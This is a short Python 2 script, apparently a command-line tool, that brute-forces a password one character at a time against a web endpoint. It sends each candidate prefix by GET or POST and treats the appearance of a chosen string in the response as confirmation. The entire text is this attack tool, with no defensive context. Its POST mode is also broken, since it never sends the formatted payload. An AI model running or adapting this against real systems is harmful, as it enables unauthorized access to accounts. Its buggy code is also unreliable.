#!/usr/bin/env python

import urllib2
from optparse import OptionParser

chars_lows = [ 'a', 'z', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'q', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'w', 'x', 'c', 'v', 'b', 'n' ]
chars_ups = [ 'A', 'Z', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'Q', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'W', 'X', 'C', 'V', 'B', 'N' ]
chars_digits = [ '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' ]
chars_specials = [ ',', '?', ';', '.', ':', '/', '!', '%', '*',  '$', '"', '\'', '(', '-', '_', ')', '=', '}', ']', '@', '^', '\\', '`', '|', '[', '{', '~' ]

chars = []
verbose = False

def test(url, string, password, data):
	if len(data) == 0:
		return test_get(url, string, password)
	return test_post(url, string, password, data)

# Checks a single password and tell if it's correct or not - GET version
def test_get(url, string, password):
	query = url.format(password)
	response = urllib2.urlopen(query)
	content = response.read()
	return string in content

# Checks a single password and tell if it's correct or not - POST version
def test_post(url, string, password, data):
	query = url.format(password)
	prepared_data = data.format(password)
	response = urllib2.urlopen(query, data)
	content = response.read()
	return string in content

# Prepares the characters used for bruteforcing password
def prepare(order):
	debug("Preparing characters...")
	global chars
	for char in order:
		if char == 'L':
			debug("Adding lower case (a-z)")
			chars = chars + chars_lows
		elif char == 'U':
			debug("Adding upper case (A-Z)")
			chars = chars + chars_ups
		elif char == 'D':
			debug("Adding digits (0-9)")
			chars = chars + chars_digits
		elif char == 'S':
			debug("Adding special characters (',', '?', ';', '.', ':', '/', '!', '%', '*',  '$', '\"', ''', '(', '-', '_', ')', '=', '}', ']', '@', '^', '\\', '`', '|', '[', '{', '~'")
			chars = chars + chars_specials
		else:
			print "Invalid character order : {}".format(char)
			return False
	return True

# Loop bruteforcing each character of password
def find(url, string, seed, data):
	for char in chars:
		newseed = seed + char
		debug("* Testing character {}. Password is {}".format(char, newseed))
		if test(url, string, newseed, data):
			print("* Character found : {}, password is {}".format(char, newseed))
			find(url, string, newseed, data)
			return
	print "* ---"
	print "* Password found : {}".format(seed)

def debug(string):
	global verbose
	if verbose:
		print string

# Options parser
parser = OptionParser()
parser.add_option("-u", dest="url", help="Target URL. {} will be replaced with the password")
parser.add_option("-s", dest="string", help="String to look for in response to check whether tested password fragment is correct")
parser.add_option("-v", dest="verbose", action="store_true", help="Verbose mode", default=False)
parser.add_option("--data", dest="data", help="Data to be sent to server. {} will be replaced with the password. Will use POST requests if provided", default="")
parser.add_option("--seed", dest="seed", help="Starting password fragment. Will start with an empty password if this option isn't provided", default="")
parser.add_option("--chars", dest="characters", help="Characters pool and order ((L)ow, (U)p, (D)igits, (S)pecials). Default to DLUS if this options isn't provided", default="DLUS")
(options, args) = parser.parse_args()

if not options.url:
	parser.error("No URL provided")
if not options.string:
	parser.error("No string provided")
verbose = options.verbose

# Go
if prepare(options.characters):
	find(options.url, options.string, options.seed, options.data)
